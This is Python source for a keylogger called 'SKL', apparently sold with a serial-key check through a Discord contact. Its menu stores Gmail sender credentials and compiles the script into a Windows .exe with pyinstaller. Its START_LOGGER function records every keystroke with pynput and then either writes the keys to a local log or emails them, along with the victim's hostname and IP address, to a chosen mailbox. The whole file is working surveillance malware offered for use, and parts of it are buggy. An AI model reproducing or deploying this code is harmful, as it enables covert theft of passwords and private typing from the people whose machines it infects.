
import os
import random
import json


os.system("cls")


commands_list = ["exit", "help", "compile", "config", "emails", "test", "mode"]
modes = ["email", "local"]



class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    DIM = '\033[2m'
    RESET_DIM = '\033[22m'
    WHITE = '\033[37m'


def printlogo():
    print(bcolors.FAIL+ """
    ░██████╗██╗░░██╗██╗░░░░░
    ██╔════╝██║░██╔╝██║░░░░░
    ╚█████╗░█████═╝░██║░░░░░
    ░╚═══██╗██╔═██╗░██║░░░░░
    ██████╔╝██║░╚██╗███████╗
    ╚═════╝░╚═╝░░╚═╝╚══════
        """)
    
    



    
    
## J S K V I B U
# JS235-SDKO3-K5FJK2-VFK3KL-IFYH5-B45F8-UY348
#serial = "JS235-SDKO3-K5FJK2-VFK3KL-IFYH5-B45F8-UY348"
def license():
    printlogo()
    print(bcolors.WARNING +  "SKL is a Licensed Product" + bcolors.WHITE + "\nIf you have " + bcolors.FAIL + "not" + bcolors.WHITE + " purchased a serial key, please contact " 
          + bcolors.OKBLUE + "voidy6059" + bcolors.WHITE + " on discord to purchase your serial key.\n")
    
    USER = os.getlogin()
    directory = "SKL"
    parent_dir = f"C:/Users/{USER}/AppData/Roaming"
                
    path = os.path.join(parent_dir, directory)
    
    try:
        os.mkdir(path)
    except:
        pass
    print(path)
    
    try:
        with open(f"{path}/serial.json","r") as f:
            parsed = json.load(f)
            serial = parsed["serial"]
            
        try:
            if serial[0] == "J" and serial[6] == "S" and serial[12] == "K" and serial[19] == "V" and serial[26] == "I" and serial[32] == "B" and serial[38] == "U":
                os.system("cls")
                return
        except:
            print()
             
            
    except:
        serial = input("Serial key: ")
        with open(f"{path}/serial.json","w") as r:
            serialJSON = {"serial": serial}
            json.dump(serialJSON,r)
           
    

    try:
        if serial[0] == "J" and serial[6] == "S" and serial[12] == "K" and serial[19] == "V" and serial[26] == "I" and serial[32] == "B" and serial[38] == "U":
          os.system("cls")
        else:
            print(bcolors.FAIL + "Invaild serial " + bcolors.WHITE + "|| please contact " + bcolors.OKBLUE + "voidy6059" + bcolors.WHITE + " to " + bcolors.OKGREEN + "purchase." + bcolors.WHITE)
            exit()
    except:
        exit()
        

license()
    


USER = os.getlogin()
directory = "SKL"
parent_dir = f"C:/Users/{USER}/AppData/Roaming"
            
path = os.path.join(parent_dir, directory)
try:
        os.mkdir(path)
except:
    pass
try:
    with open(f"{path}/config.json","r") as f:
         json.load(f)
except:
     with open(f"{path}/config.json","w") as f:
         json.load(f)

JsonPath = f"{path}/config.json"
    


class newConfig():


    def print_data():
        with open(f"{JsonPath}","r") as pf:
            return json.load(pf)
        

    def edit_data():
        with open(f"{JsonPath}", "r") as ef:

            parsed = json.load(ef)
            try:
                Mode = parsed["mode"]
            except:
                pass
           
     
            senderEmail = input(bcolors.FAIL + "Sender Email: "+ bcolors.WHITE)
            senderPassword = input(bcolors.FAIL + "Sender Password: "+ bcolors.WHITE)
            recieverEmail = input(bcolors.OKGREEN + "Receiver Email: " + bcolors.WHITE)

            with open(f"{JsonPath}", "w") as ev:           
                new = {'sender_email': senderEmail, 'receiver_email': recieverEmail, 'sender_password': senderPassword, "mode": Mode}
                json.dump(new,ev)
            
            print(bcolors.WARNING + "Data changed.")
            return bcolors.WHITE    
        
    def mode():
          os.system("cls")
          printlogo()
          with open(f"{JsonPath}", "r") as ef:

            parsed = json.load(ef)
           
            try:
                
                senderEmail = parsed["sender_email"]
                senderPassword = parsed["sender_password"]
                recieverEmail = parsed["receiver_email"]
            except:
                senderEmail = "senderEmail"
                senderPassword = "senderPassword"
                recieverEmail = "recieverEmail"

            print(bcolors.FAIL + "Please select, (email) or (local) mode")
            Mode = input(bcolors.WHITE + "")

            if Mode in modes:
                print(bcolors.WARNING + "Data Changed.")

                with open(f"{JsonPath}", "w") as ev:
                    new = {'sender_email': senderEmail, 'receiver_email': recieverEmail, 'sender_password': senderPassword, "mode": Mode}
                    json.dump(new,ev)

            else:
                input(bcolors.DIM + bcolors.FAIL + "Invaild Option, try again...")
                newConfig.mode()

            return bcolors.WHITE   

            
     





print("....Welcome to SKL....\nType \"help\" for a list of commands")

def __main__():
    print( bcolors.RESET_DIM +bcolors.WARNING + "SKL (Simple Key Logger)")
    CONSOLE = input(bcolors.WARNING + "Command: " + bcolors.WHITE)
    os.system("cls")
    printlogo()
    return_c = 1

    if CONSOLE.lower() not in commands_list:
        print(bcolors.DIM + bcolors.FAIL + f"INVAILD COMMAND || USER ERROR \n{CONSOLE} was not found....")
        print(bcolors.RESET_DIM + "type \"help\" for avaliable commands. \n\n")
        


    if CONSOLE.lower() == "help":
        os.system("cls")
        printlogo()
        print(bcolors.OKCYAN + "Here's a list of avaliable commands:" + "\n" + bcolors.FAIL + "(config) " + bcolors.DIM + "Change Sender & Receiver Emails" + "\n" +
               bcolors.RESET_DIM + "(compile) " + bcolors.DIM + "Compiles the project into a .exe to be used." + bcolors.RESET_DIM + 
               "\n(exit) " + bcolors.DIM + "Close the SKL Program" +
                 bcolors.RESET_DIM + "\n(emails) " + bcolors.DIM + "Shows your current saved config."+bcolors.RESET_DIM + "\n(Mode)" +
                 bcolors.DIM + " choose between 'local' or 'email' mode." + bcolors.RESET_DIM)
        

    elif CONSOLE.lower() == "config":
        os.system("cls")
        printlogo()
        print(newConfig.edit_data())

    elif CONSOLE.lower() == "emails":
        os.system("cls")
        printlogo()
        print(bcolors.DIM + "Here's your current saved data.")
        print(bcolors.WHITE + bcolors.RESET_DIM)
        print(newConfig.print_data())

    elif CONSOLE.lower() == "exit": 
        os.system("cls")
        printlogo()
        print(bcolors.FAIL + "Exiting SKL...")
        return_c = 0

    elif CONSOLE.lower() == "compile":
        try:
          
           os.system("pyinstaller --onefile SKL.py")
           status = open("compilerID.txt")
           status.write(random.randint(10000,99999))
        except:
            print(bcolors.FAIL + "Failed to compile KeyLogger.\n Please make sure SKlogger.py is in the directory of this file.")


       

    elif CONSOLE.lower() == "mode":
        os.system("cls")
        printlogo()
        print(newConfig.mode())



    
        
    if return_c == 1:
        bcolors.WHITE
        __main__()

printlogo()
__main__()

print(bcolors.WHITE)



def START_LOGGER():
    from pynput.keyboard import Key, Listener
    import smtplib, ssl
    import json
    import socket   
    
    
    def checkConfig():
        with open(f"{JsonPath}/config.json") as ef:
            parsed = json.load(ef)


            try:
                Mode = parsed["mode"]
            except:
                print(bcolors.FAIL + bcolors.BOLD + "FAILURE!\nyour mode is not setup. please use the command 'mode' to set it up")
            try:
                senderEmail = parsed["sender_email"]
                senderPassword = parsed["sender_password"]
                recieverEmail = parsed["receiver_email"]
            except:
                print(bcolors.FAIL + bcolors.BOLD + "FAILURE!\nyour Email Config is not setup. please use the command 'config' to set it up")
                
                
    
    

    def getIP():
        hostname=socket.gethostname()   
        IPAddr=socket.gethostbyname(hostname)   
        return hostname, IPAddr



    with open(f"{JsonPath}","r") as file:
        parsed = json.load(file)
        Jsender_email = parsed["sender_email"]
        Jsender_password = parsed["sender_password"]
        Jreceiver_email = parsed["receiver_email"]

        mode = parsed['mode']
    Key_mode = True
    Email_mode = False
        
    if mode == "email":
        Key_mode = False
        Email_mode = True
    elif mode == "local":
        Key_mode = True
        Email_mode = False
    def email(keysGiven):
        port = 465  # For SSL
        smtp_server = "smtp.gmail.com"
        sender_email = Jsender_email
        receiver_email = Jreceiver_email  
        password = Jsender_password
        message = f"""\
            Subject: KEYS 

        {keysGiven}."""

        context = ssl.create_default_context()
        with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email, message)
    keys_pressed = 0
    SendMail = bool
    keys = []
    def on_press(key):
        global keys_pressed
        global keys
        emailBool = False
        keypressed = key
        if keypressed == Key.space:
            keypressed = "   "
        elif keypressed == Key.backspace:
            keypressed= "<== "
            keys_pressed =- 2
        elif keypressed == Key.enter:
            keypressed = "\n"
            emailBool = True
        elif keypressed == "'":
            keypressed = "_Apostro4phe_"
        elif str(keypressed).startswith("Key."):
            keypressed = ""
            keys_pressed =- 2
        keys.append(str(keypressed))
        keys_pressed += 1
        if keys_pressed > 20 and Key_mode == True:   
            file = open(f"./out/Spicy-Logs++", "a") 
            UNmessage = "".join(keys)
            message = UNmessage.replace("'","")
            message = message.replace("_Apostro4phe_","'")
            file.write(str(message))
            keys_pressed = 0 
            keys = []
        if emailBool == True and Email_mode == True:
            UNmessage = "".join(keys)
            message = UNmessage.replace("'","")
            message = message.replace("_Apostro4phe_","'")
            if SendMail == True:
                email(message)
            emailBool = False
            keys = []
    def isMaillable():
        global SendMail
        try:
            host_Data = getIP()
            email(f"Started Process || {host_Data}")
            SendMail = True 
        except:
            SendMail = False
            print(SendMail)
    with Listener(on_press=on_press) as listener :
        isMaillable()
        listener.join()



